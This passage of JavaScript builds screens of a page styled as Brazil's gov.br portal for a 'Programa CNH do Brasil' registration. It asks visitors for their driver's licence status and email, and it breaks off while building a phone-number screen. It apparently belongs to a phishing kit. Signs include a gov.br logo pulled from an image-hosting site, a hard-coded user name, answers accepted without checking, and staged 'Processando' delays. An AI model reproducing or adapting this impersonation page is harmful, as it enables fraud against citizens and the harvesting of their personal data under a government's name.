        const mainHeader = document.createElement('header');
        mainHeader.style.cssText = 'background-color: white; padding: 12px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; box-shadow: none;';
        
        // Container esquerdo
        const leftContainer = document.createElement('div');
        leftContainer.style.cssText = 'display: flex; align-items: center; background: none; box-shadow: none;';
        
        const logoImg = document.createElement('img');
        logoImg.src = 'https://i.ibb.co/zPFChvR/logo645.png';
        logoImg.alt = 'Logo gov.br estilizada com texto em azul e amarelo';
        logoImg.width = 70;
        logoImg.height = 24;
        logoImg.style.cssText = 'margin-right: 32px; background: none; box-shadow: none;';
        leftContainer.appendChild(logoImg);
        
        const menuBtn = document.createElement('button');
        menuBtn.setAttribute('aria-label', 'Menu de links');
        menuBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); font-size: 14px; margin-left: 32px; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><circle cx="8" cy="3" r="2"/><circle cx="8" cy="8" r="2"/><circle cx="8" cy="13" r="2"/></svg>';
        leftContainer.appendChild(menuBtn);
        
        const divider = document.createElement('div');
        divider.style.cssText = 'border-left: 1px solid rgb(204, 204, 204); height: 24px; margin: 0px 16px; background: none; box-shadow: none;';
        leftContainer.appendChild(divider);
        
        mainHeader.appendChild(leftContainer);
        
        // Container direito
        const rightContainer = document.createElement('div');
        rightContainer.style.cssText = 'display: flex; align-items: center; background: none; box-shadow: none;';
        
        const cookieBtn = document.createElement('button');
        cookieBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); cursor: pointer; margin-left: 24px; background: none; box-shadow: none; padding: 0px;';
        cookieBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M6.5 2a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h3a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-3zm-3 2a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h9a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-9zm0 3a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h9a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-9zm0 3a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h9a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-9z"/></svg>';
        rightContainer.appendChild(cookieBtn);
        
        const gridBtn = document.createElement('button');
        gridBtn.type = 'button';
        gridBtn.setAttribute('aria-label', 'Sistemas');
        gridBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); cursor: pointer; margin-left: 24px; background: none; box-shadow: none; padding: 0px;';
        gridBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M1 2.5A1.5 1.5 0 0 1 2.5 1h3A1.5 1.5 0 0 1 7 2.5v3A1.5 1.5 0 0 1 5.5 7h-3A1.5 1.5 0 0 1 1 5.5v-3zm8 0A1.5 1.5 0 0 1 10.5 1h3A1.5 1.5 0 0 1 15 2.5v3A1.5 1.5 0 0 1 13.5 7h-3A1.5 1.5 0 0 1 9 5.5v-3zm-8 8A1.5 1.5 0 0 1 2.5 9h3A1.5 1.5 0 0 1 7 10.5v3A1.5 1.5 0 0 1 5.5 15h-3A1.5 1.5 0 0 1 1 13.5v-3zm8 0A1.5 1.5 0 0 1 10.5 9h3a1.5 1.5 0 0 1 1.5 1.5v3a1.5 1.5 0 0 1-1.5 1.5h-3A1.5 1.5 0 0 1 9 13.5v-3z"/></svg>';
        rightContainer.appendChild(gridBtn);
        
        const userBtn = document.createElement('button');
        userBtn.type = 'button';
        userBtn.style.cssText = 'background-color: rgb(20, 81, 180); color: white; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; border-radius: 9999px; padding: 6px 16px; display: flex; align-items: center; font-size: 14px; cursor: pointer; margin-left: 24px; box-shadow: none;';
        userBtn.innerHTML = '<svg aria-hidden="true" style="color: white; margin-right: 8px; background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M8 8a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm2-3a2 2 0 1 1-4 0 2 2 0 0 1 4 0zm4 8c0 1-1 1-1 1H3s-1 0-1-1 1-4 6-4 6 3 6 4zm-1-.004c-.001-.246-.154-.986-.832-1.664C11.516 10.68 10.289 10 8 10c-2.29 0-3.516.68-4.168 1.332-.678.678-.83 1.418-.832 1.664h10z"/></svg><span>ALBERTINO</span>';
        rightContainer.appendChild(userBtn);
        
        mainHeader.appendChild(rightContainer);
        this.container.appendChild(mainHeader);
        
        // Criar navegação secundária
        const nav = document.createElement('nav');
        nav.style.cssText = 'background-color: white; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium medium 1px; border-style: none none solid; border-color: currentcolor currentcolor rgb(229, 229, 229); border-image: initial; box-shadow: none;';
        
        const menuContainer = document.createElement('button');
        menuContainer.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); display: flex; align-items: center; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuContainer.innerHTML = '<svg aria-hidden="true" style="margin-right: 10px; font-size: 16px; background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M2.5 12a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5z"/></svg><span style="color: rgb(102, 102, 102); font-size: 1rem; font-weight: 300; line-height: 20px; padding-top: 2px; background: none; box-shadow: none;">Programa CNH do Brasil</span>';
        nav.appendChild(menuContainer);
        
        const searchBtn = document.createElement('button');
        searchBtn.setAttribute('aria-label', 'Pesquisar');
        searchBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); font-size: 16px; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        searchBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001c.03.04.062.078.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1.007 1.007 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0z"/></svg>';
        nav.appendChild(searchBtn);
        
        this.container.appendChild(nav);
        
        // Criar container principal
        const main = document.createElement('main');
        main.id = 'main-signin';
        main.style.cssText = 'width: 100%; max-width: 800px; margin: 20px auto; min-height: 100vh; padding: 20px;';

        // Card principal que envolve todo o conteúdo
        const card = document.createElement('div');
        card.className = 'card';
        card.style.cssText = 'width: 100%; align-items: flex-start; padding: 1rem; background-color: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);';

        const title = document.createElement('h3');
        title.className = 'text-center w-full text-lg font-bold mb-6';
        title.textContent = 'Confirme seus dados para o cadastro no Programa CNH do Brasil';
        title.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 1rem; font-weight: 600;';
        card.appendChild(title);

        const content = document.createElement('div');
        content.className = 'w-full';

        const questionContainer = document.createElement('div');
        
        // Número e pergunta
        const questionHeader = document.createElement('div');
        questionHeader.className = 'flex items-center gap-3 mb-4';
        
        const numberCircle = document.createElement('div');
        numberCircle.className = 'flex items-center justify-center w-6 h-6 rounded-full bg-[#1351B4] text-white text-sm font-medium';
        numberCircle.textContent = '5';
        questionHeader.appendChild(numberCircle);
        
        const questionText = document.createElement('p');
        questionText.className = 'font-semibold text-base';
        questionText.textContent = 'QUAL SITUAÇÃO ATUAL DA HABILITAÇÃO?';
        questionText.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; font-weight: 600;';
        questionHeader.appendChild(questionText);
        
        questionContainer.appendChild(questionHeader);

        // Opções de situação da habilitação - sem validação de certo/errado
        const optionsContainer = document.createElement('div');
        optionsContainer.className = 'space-y-3 pl-4';

        const licenseStatuses = [
            'NUNCA TIVE CNH',
            'JÁ TIVE CNH, MAS ESTÁ COM PRAZO VENCIDO',
            'JÁ TIVE CNH, MAS ESTÁ COM SUSPENSÃO',
            'TENHO CNH ATIVA E VÁLIDA',
            'TENHO CNH, MAS ESTÁ COM BLOQUEIO'
        ];
        
        licenseStatuses.forEach((status, index) => {
            const option = document.createElement('div');
            option.className = 'flex items-center w-full p-3 rounded-md transition-all cursor-pointer bg-gray-50 hover:bg-gray-100';
            
            const label = document.createElement('label');
            label.htmlFor = `license-option-${index}`;
            label.className = 'flex-1 cursor-pointer';
            label.textContent = status;
            label.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem;';
            
            const radio = document.createElement('input');
            radio.type = 'radio';
            radio.name = 'license-option';
            radio.id = `license-option-${index}`;
            radio.value = status;
            radio.style.display = 'none';
            
            option.appendChild(radio);
            option.appendChild(label);
            
            option.addEventListener('click', () => {
                document.querySelectorAll('.flex.items-center.w-full.p-3.rounded-md').forEach(opt => {
                    opt.style.backgroundColor = '#f9fafb';
                    opt.style.border = 'none';
                });
                option.style.backgroundColor = '#e5e7eb';
                option.style.border = '2px solid rgb(19, 81, 180)';
                radio.checked = true;
            });
            
            optionsContainer.appendChild(option);
        });

        questionContainer.appendChild(optionsContainer);

        // Botão Confirmar
        const buttonContainer = document.createElement('div');
        buttonContainer.className = 'flex justify-center mt-6';
        
        const confirmBtn = document.createElement('button');
        confirmBtn.type = 'button';
        confirmBtn.className = 'button-continuar flex items-center justify-center gap-2 min-w-[160px]';
        confirmBtn.textContent = 'Confirmar';
        confirmBtn.addEventListener('click', () => {
            const selectedOption = document.querySelector('input[name="license-option"]:checked');
            if (selectedOption) {
                // Estado de processando (sem verificação de certo/errado)
                confirmBtn.innerHTML = '<svg class="animate-spin" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0a8 8 0 1 0 8 8A8 8 0 0 0 8 0zM4.5 7.5a.5.5 0 0 1 .5-.5h6a.5.5 0 0 1 0 1H5a.5.5 0 0 1-.5-.5z"/></svg> Processando...';
                confirmBtn.disabled = true;
                
                // Armazenar situação da habilitação e prosseguir
                localStorage.setItem('userLicenseStatus', selectedOption.value);
                
                setTimeout(() => {
                    confirmBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M10.97 4.97a.75.75 0 0 1 1.07 1.05l-3.99 4.99a.75.75 0 0 1-1.08.02L4.324 8.384a.75.75 0 1 1 1.06-1.06l2.094 2.093 3.473-4.425a.75.75 0 0 1 1.02-.12z"/></svg> Confirmado';
                    
                    setTimeout(() => {
                        this.showEmailScreen(data);
                    }, 500);
                }, 1500);
            }
        });
        
        buttonContainer.appendChild(confirmBtn);
        questionContainer.appendChild(buttonContainer);

        content.appendChild(questionContainer);
        card.appendChild(content);
        main.appendChild(card);
        
        // Adicionar header e tela de verificação ao container
        this.container.appendChild(main);
    }

    showEmailScreen(data) {
        // Limpar completamente o container
        this.container.innerHTML = '';
        
        // Criar header principal no formato correto
        const mainHeader = document.createElement('header');
        mainHeader.style.cssText = 'background-color: white; padding: 12px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; box-shadow: none;';
        
        // Container esquerdo
        const leftContainer = document.createElement('div');
        leftContainer.style.cssText = 'display: flex; align-items: center; background: none; box-shadow: none;';
        
        const logoImg = document.createElement('img');
        logoImg.src = 'https://i.ibb.co/zPFChvR/logo645.png';
        logoImg.alt = 'Logo gov.br estilizada com texto em azul e amarelo';
        logoImg.width = 70;
        logoImg.height = 24;
        logoImg.style.cssText = 'margin-right: 32px; background: none; box-shadow: none;';
        leftContainer.appendChild(logoImg);
        
        const menuBtn = document.createElement('button');
        menuBtn.setAttribute('aria-label', 'Menu de links');
        menuBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); font-size: 14px; margin-left: 32px; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><circle cx="8" cy="3" r="2"/><circle cx="8" cy="8" r="2"/><circle cx="8" cy="13" r="2"/></svg>';
        leftContainer.appendChild(menuBtn);
        
        const divider = document.createElement('div');
        divider.style.cssText = 'border-left: 1px solid rgb(204, 204, 204); height: 24px; margin: 0px 16px; background: none; box-shadow: none;';
        leftContainer.appendChild(divider);
        
        mainHeader.appendChild(leftContainer);
        
        // Container direito
        const rightContainer = document.createElement('div');
        rightContainer.style.cssText = 'display: flex; align-items: center; background: none; box-shadow: none;';
        
        const cookieBtn = document.createElement('button');
        cookieBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); cursor: pointer; margin-left: 24px; background: none; box-shadow: none; padding: 0px;';
        cookieBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M6.5 2a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h3a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-3zm-3 2a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h9a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-9zm0 3a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h9a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-9zm0 3a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h9a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-9z"/></svg>';
        rightContainer.appendChild(cookieBtn);
        
        const gridBtn = document.createElement('button');
        gridBtn.type = 'button';
        gridBtn.setAttribute('aria-label', 'Sistemas');
        gridBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); cursor: pointer; margin-left: 24px; background: none; box-shadow: none; padding: 0px;';
        gridBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M1 2.5A1.5 1.5 0 0 1 2.5 1h3A1.5 1.5 0 0 1 7 2.5v3A1.5 1.5 0 0 1 5.5 7h-3A1.5 1.5 0 0 1 1 5.5v-3zm8 0A1.5 1.5 0 0 1 10.5 1h3A1.5 1.5 0 0 1 15 2.5v3A1.5 1.5 0 0 1 13.5 7h-3A1.5 1.5 0 0 1 9 5.5v-3zm-8 8A1.5 1.5 0 0 1 2.5 9h3A1.5 1.5 0 0 1 7 10.5v3A1.5 1.5 0 0 1 5.5 15h-3A1.5 1.5 0 0 1 1 13.5v-3zm8 0A1.5 1.5 0 0 1 10.5 9h3a1.5 1.5 0 0 1 1.5 1.5v3a1.5 1.5 0 0 1-1.5 1.5h-3A1.5 1.5 0 0 1 9 13.5v-3z"/></svg>';
        rightContainer.appendChild(gridBtn);
        
        const userBtn = document.createElement('button');
        userBtn.type = 'button';
        userBtn.style.cssText = 'background-color: rgb(20, 81, 180); color: white; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; border-radius: 9999px; padding: 6px 16px; display: flex; align-items: center; font-size: 14px; cursor: pointer; margin-left: 24px; box-shadow: none;';
        userBtn.innerHTML = '<svg aria-hidden="true" style="color: white; margin-right: 8px; background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M8 8a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm2-3a2 2 0 1 1-4 0 2 2 0 0 1 4 0zm4 8c0 1-1 1-1 1H3s-1 0-1-1 1-4 6-4 6 3 6 4zm-1-.004c-.001-.246-.154-.986-.832-1.664C11.516 10.68 10.289 10 8 10c-2.29 0-3.516.68-4.168 1.332-.678.678-.83 1.418-.832 1.664h10z"/></svg><span>ALBERTINO</span>';
        rightContainer.appendChild(userBtn);
        
        mainHeader.appendChild(rightContainer);
        this.container.appendChild(mainHeader);
        
        // Criar navegação secundária
        const nav = document.createElement('nav');
        nav.style.cssText = 'background-color: white; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium medium 1px; border-style: none none solid; border-color: currentcolor currentcolor rgb(229, 229, 229); border-image: initial; box-shadow: none;';
        
        const menuContainer = document.createElement('button');
        menuContainer.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); display: flex; align-items: center; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuContainer.innerHTML = '<svg aria-hidden="true" style="margin-right: 10px; font-size: 16px; background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M2.5 12a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5z"/></svg><span style="color: rgb(102, 102, 102); font-size: 1rem; font-weight: 300; line-height: 20px; padding-top: 2px; background: none; box-shadow: none;">Programa CNH do Brasil</span>';
        nav.appendChild(menuContainer);
        
        const searchBtn = document.createElement('button');
        searchBtn.setAttribute('aria-label', 'Pesquisar');
        searchBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); font-size: 16px; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        searchBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001c.03.04.062.078.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1.007 1.007 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0z"/></svg>';
        nav.appendChild(searchBtn);
        
        this.container.appendChild(nav);
        
        // Criar container principal
        const main = document.createElement('main');
        main.id = 'main-signin';
        main.style.cssText = 'width: 100%; max-width: 800px; margin: 20px auto; min-height: 100vh; padding: 20px;';

        // Card principal que envolve todo o conteúdo
        const card = document.createElement('div');
        card.className = 'card';
        card.style.cssText = 'width: 100%; align-items: flex-start; padding: 2rem; background-color: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);';

        const title = document.createElement('h3');
        title.className = 'text-center w-full text-lg font-bold mb-6';
        title.textContent = 'Confirme seus dados para o cadastro no Programa CNH do Brasil';
        title.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 1rem; font-weight: 600;';
        card.appendChild(title);

        const content = document.createElement('div');
        content.className = 'w-full';

        const questionContainer = document.createElement('div');
        
        // Número e pergunta
        const questionHeader = document.createElement('div');
        questionHeader.className = 'flex items-center gap-3 mb-4';
        
        const numberCircle = document.createElement('div');
        numberCircle.className = 'flex items-center justify-center w-6 h-6 rounded-full bg-[#1351B4] text-white text-sm font-medium';
        numberCircle.textContent = '6';
        questionHeader.appendChild(numberCircle);
        
        const questionText = document.createElement('p');
        questionText.className = 'font-semibold text-base';
        questionText.textContent = 'QUAL É O SEU E-MAIL?';
        questionText.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; font-weight: 600;';
        questionHeader.appendChild(questionText);
        
        questionContainer.appendChild(questionHeader);

        // Campo de email
        const emailContainer = document.createElement('div');
        emailContainer.className = 'pl-4';
        
        const emailInput = document.createElement('input');
        emailInput.type = 'email';
        emailInput.id = 'email-input';
        emailInput.placeholder = 'Digite seu e-mail';
        emailInput.style.cssText = 'width: 100%; padding: 12px; border: 2px solid #e5e7eb; border-radius: 8px; font-size: 0.875rem; font-family: Rawline, system-ui, sans-serif; outline: none; transition: border-color 0.3s;';
        
        emailInput.addEventListener('focus', () => {
            emailInput.style.borderColor = 'rgb(19, 81, 180)';
        });
        
        emailInput.addEventListener('blur', () => {
            emailInput.style.borderColor = '#e5e7eb';
        });
        
        emailContainer.appendChild(emailInput);
        questionContainer.appendChild(emailContainer);

        // Botão Confirmar
        const buttonContainer = document.createElement('div');
        buttonContainer.className = 'flex justify-center mt-6';
        
        const confirmBtn = document.createElement('button');
        confirmBtn.type = 'button';
        confirmBtn.className = 'button-continuar flex items-center justify-center gap-2 min-w-[160px]';
        confirmBtn.textContent = 'Confirmar';
        confirmBtn.addEventListener('click', () => {
            const email = emailInput.value.trim();
            if (email) {
                // Validação básica de email
                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                if (!emailRegex.test(email)) {
                    alert('Por favor, digite um e-mail válido.');
                    return;
                }
                
                // Estado de processando
                confirmBtn.innerHTML = '<svg class="animate-spin" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0a8 8 0 1 0 8 8A8 8 0 0 0 8 0zM4.5 7.5a.5.5 0 0 1 .5-.5h6a.5.5 0 0 1 0 1H5a.5.5 0 0 1-.5-.5z"/></svg> Processando...';
                confirmBtn.disabled = true;
                
                // Armazenar email e prosseguir
                localStorage.setItem('userEmail', email);
                
                setTimeout(() => {
                    confirmBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M10.97 4.97a.75.75 0 0 1 1.07 1.05l-3.99 4.99a.75.75 0 0 1-1.08.02L4.324 8.384a.75.75 0 1 1 1.06-1.06l2.094 2.093 3.473-4.425a.75.75 0 0 1 1.02-.12z"/></svg> Confirmado';
                    
                    setTimeout(() => {
                        this.showPhoneScreen(data);
                    }, 500);
                }, 1500);
            } else {
                alert('Por favor, digite seu e-mail.');
            }
        });
        
        buttonContainer.appendChild(confirmBtn);
        questionContainer.appendChild(buttonContainer);

        content.appendChild(questionContainer);
        card.appendChild(content);
        main.appendChild(card);
        
        // Adicionar header e tela de verificação ao container
        this.container.appendChild(main);
    }

    showPhoneScreen(data) {
        // Limpar completamente o container
        this.container.innerHTML = '';
        
        // Criar header principal no formato correto
        const mainHeader = document.createElement('header');
        mainHeader.style.cssText = 'background-color: white; padding: 12px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; box-shadow: none;';
        
        // Container esquerdo
        const leftContainer = document.createElement('div');
        leftContainer.style.cssText = 'display: flex; align-items: center; background: none; box-shadow: none;';
        
        const logoImg = document.createElement('img');
        logoImg.src = 'https://i.ibb.co/zPFChvR/logo645.png';
        logoImg.alt = 'Logo gov.br estilizada com texto em azul e amarelo';
        logoImg.width = 70;
        logoImg.height = 24;
        logoImg.style.cssText = 'margin-right: 32px; background: none; box-shadow: none;';
        leftContainer.appendChild(logoImg);
        
        const menuBtn = document.createElement('button');
        menuBtn.setAttribute('aria-label', 'Menu de links');
        menuBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); font-size: 14px; margin-left: 32px; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><circle cx="8" cy="3" r="2"/><circle cx="8" cy="8" r="2"/><circle cx="8" cy="13" r="2"/></svg>';
        leftContainer.appendChild(menuBtn);
        
        const divider = document.createElement('div');
        divider.style.cssText = 'border-left: 1px solid rgb(204, 204, 204); height: 24px; margin: 0px 16px; background: none; box-shadow: none;';
        leftContainer.appendChild(divider);
        
        mainHeader.appendChild(leftContainer);
        
        // Container direito
        const rightContainer = document.createElement('div');
        rightContainer.style.cssText = 'display: flex; align-items: center; background: none; box-shadow: none;';
        
        const cookieBtn = document.createElement('button');
        cookieBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); cursor: pointer; margin-left: 24px; background: none; box-shadow: none; padding: 0px;';
        cookieBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M6.5 2a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h3a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-3zm-3 2a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h9a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-9zm0 3a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h9a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-9zm0 3a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h9a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-9z"/></svg>';
        rightContainer.appendChild(cookieBtn);
        
        const gridBtn = document.createElement('button');
        gridBtn.type = 'button';
        gridBtn.setAttribute('aria-label', 'Sistemas');
        gridBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); cursor: pointer; margin-left: 24px; background: none; box-shadow: none; padding: 0px;';
        gridBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M1 2.5A1.5 1.5 0 0 1 2.5 1h3A1.5 1.5 0 0 1 7 2.5v3A1.5 1.5 0 0 1 5.5 7h-3A1.5 1.5 0 0 1 1 5.5v-3zm8 0A1.5 1.5 0 0 1 10.5 1h3A1.5 1.5 0 0 1 15 2.5v3A1.5 1.5 0 0 1 13.5 7h-3A1.5 1.5 0 0 1 9 5.5v-3zm-8 8A1.5 1.5 0 0 1 2.5 9h3A1.5 1.5 0 0 1 7 10.5v3A1.5 1.5 0 0 1 5.5 15h-3A1.5 1.5 0 0 1 1 13.5v-3zm8 0A1.5 1.5 0 0 1 10.5 9h3a1.5 1.5 0 0 1 1.5 1.5v3a1.5 1.5 0 0 1-1.5 1.5h-3A1.5 1.5 0 0 1 9 13.5v-3z"/></svg>';
        rightContainer.appendChild(gridBtn);
        
        const userBtn = document.createElement('button');
        userBtn.type = 'button';
        userBtn.style.cssText = 'background-color: rgb(20, 81, 180); color: white; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; border-radius: 9999px; padding: 6px 16px; display: flex; align-items: center; font-size: 14px; cursor: pointer; margin-left: 24px; box-shadow: none;';
        userBtn.innerHTML = '<svg aria-hidden="true" style="color: white; margin-right: 8px; background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M8 8a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm2-3a2 2 0 1 1-4 0 2 2 0 0 1 4 0zm4 8c0 1-1 1-1 1H3s-1 0-1-1 1-4 6-4 6 3 6 4zm-1-.004c-.001-.246-.154-.986-.832-1.664C11.516 10.68 10.289 10 8 10c-2.29 0-3.516.68-4.168 1.332-.678.678-.83 1.418-.832 1.664h10z"/></svg><span>ALBERTINO</span>';
        rightContainer.appendChild(userBtn);
        
        mainHeader.appendChild(rightContainer);
        this.container.appendChild(mainHeader);
        
        // Criar navegação secundária
        const nav = document.createElement('nav');
        nav.style.cssText = 'background-color: white; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium medium 1px; border-style: none none solid; border-color: currentcolor currentcolor rgb(229, 229, 229); border-image: initial; box-shadow: none;';
        
        const menuContainer = document.createElement('button');
        menuContainer.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); display: flex; align-items: center; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuContainer.innerHTML = '<svg aria-hidden="true" style="margin-right: 10px; font-size: 16px; background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M2.5 12a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5z"/></svg><span style="color: rgb(102, 102, 102); font-size: 1rem; font-weight: 300; line-height: 20px; padding-top: 2px; background: none; box-shadow: none;">Programa CNH do Brasil</span>';
        nav.appendChild(menuContainer);
        
        const searchBtn = document.createElement('button');
        searchBtn.setAttribute('aria-label', 'Pesquisar');
        searchBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); font-size: 16px; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
